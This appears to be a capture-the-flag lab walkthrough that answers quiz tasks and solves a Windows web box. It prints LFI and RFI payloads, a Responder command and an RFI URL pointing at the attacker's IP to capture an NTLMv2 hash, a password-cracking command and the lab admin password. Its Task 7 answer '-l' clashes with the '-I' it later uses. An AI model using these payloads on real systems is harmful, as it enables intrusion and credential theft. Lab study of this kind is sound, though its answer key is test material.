# Task 1: When visiting the web service using the IP address, what is the domain that we are being redirected to?
unika.htb

# Task 2: Which scripting language is being used on the server to generate webpages?
php

# Task 3: What is the name of the URL parameter which is used to load different language versions of the webpage?
page

# Task 4: Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
../../../../../../../../windows/system32/drivers/etc/hosts

# Task 5: Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
//10.10.14.6/somefile

# Task 6: What does NTLM stand for?
New Technology Lan Manager

# Task 7: Which flag do we use in the Responder utility to specify the network interface?
-l

# Task 8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
John The Ripper

# Task 9: What is the password for the administrator user?
badminton

# Task 10: We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
5985

# Flag: 
When we access to our IP address, it redirects us to unika.htb. So what we need to do is resolve the hostname `unika.htb` by this command `echo "{ip} unika.htb" | sudo tee -a /etc/hosts`.

When we change language, we can see the parameter of the site. Then we check if LFI happen or not. `../../../../..\windows\system32\drivers\etc\hosts`. Run `sudo responder -I tun0` and reload `http://unika.htb/index.php?page=//{tun0 IP}/adsadsa` then we will get NTLMv2 hash. Using `John The Ripper` to crack it. `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
